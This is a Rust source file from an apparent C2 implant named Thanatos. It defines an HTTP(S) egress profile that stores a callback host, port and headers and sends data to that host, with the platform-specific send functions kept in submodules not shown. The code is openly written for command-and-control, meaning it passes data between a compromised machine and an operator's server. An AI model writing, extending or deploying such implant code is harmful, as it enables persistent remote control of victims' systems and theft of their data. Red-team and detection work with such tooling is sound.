#![warn(missing_docs)]
#![warn(clippy::missing_docs_in_private_items)]

//! Implementation for C2 communication over HTTP(s)

use std::collections::HashMap;

use super::EgressProfile;
use agent_utils::errors::ThanatosError;

#[cfg(target_os = "linux")]
mod linux;

#[cfg(target_os = "windows")]
mod windows;

/// Definition for the HTTP C2 profile.
#[derive(Debug)]
pub struct HttpProfile {
    /// Configured callback host
    host: String,

    /// Configured callback port
    port: u32,

    /// Any HTTP headers
    headers: HashMap<&'static str, &'static str>,

    /// Whether the profile should do a TLS connection
    #[cfg(feature = "https")]
    use_tls: bool,
}

impl HttpProfile {
    /// Constructs a new instance of the HTTP C2 profile
    pub fn new(host: &str) -> Result<Self, ThanatosError> {
        let headers = config::http::get_headers();
        let mut headers_map = HashMap::new();

        headers.into_iter().for_each(|(key, value)| {
            headers_map.insert(*key, *value);
        });

        Ok(Self {
            host: host.to_string(),
            port: config::http::get_callback_port(),
            headers: headers_map,

            #[cfg(feature = "https")]
            use_tls: host.starts_with("https://"),
        })
    }
}

impl EgressProfile for HttpProfile {
    fn send_data(&mut self, data: &impl AsRef<str>) -> Result<String, ThanatosError> {
        #[cfg(all(feature = "https", feature = "http"))]
        return {
            if self.use_tls {
                self.send_https(data.as_ref())
            } else {
                self.send_http(data.as_ref())
            }
        };

        #[cfg(all(feature = "https", not(feature = "http")))]
        return self.send_https(data.as_ref());

        #[cfg(all(feature = "http", not(feature = "https")))]
        return self.send_http(data.as_ref());
    }
}
